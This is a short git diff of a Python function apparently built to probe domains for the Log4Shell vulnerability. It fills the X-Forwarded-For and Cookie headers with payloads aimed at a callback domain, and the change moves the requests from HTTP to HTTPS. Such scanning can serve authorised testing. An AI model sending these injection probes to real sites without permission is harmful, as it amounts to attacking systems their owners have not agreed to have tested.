@@ -56,16 +56,9 @@ def log4shell(domain):
             'X-Forwarded-For': payload(fakedomain, 'X-Forwarded-For'),
             'Cookie': payload(fakedomain, 'Cookie'),
         }
-        response = requests.get(f"http://{domain}", headers=headers, timeout=TIMEOUT)
-        # response = requests.get(f"http://{domain}", timeout=TIMEOUT)
+        # only use tls because that way headers are encrypted
+        response = requests.get(f"https://{domain}", headers=headers, timeout=TIMEOUT)
         response.raise_for_status()
-        print(f"response: {response.status_code}")
-
-        if not response.url.startswith('https'):
-            print("response ended with http")
-            # response = requests.get(f"http://{domain}", timeout=TIMEOUT)
-            response = requests.get(f"https://{domain}", headers=headers, verify=False, timeout=TIMEOUT)
-            response.raise_for_status()
         to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
     except requests.exceptions.HTTPError as e:
         to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
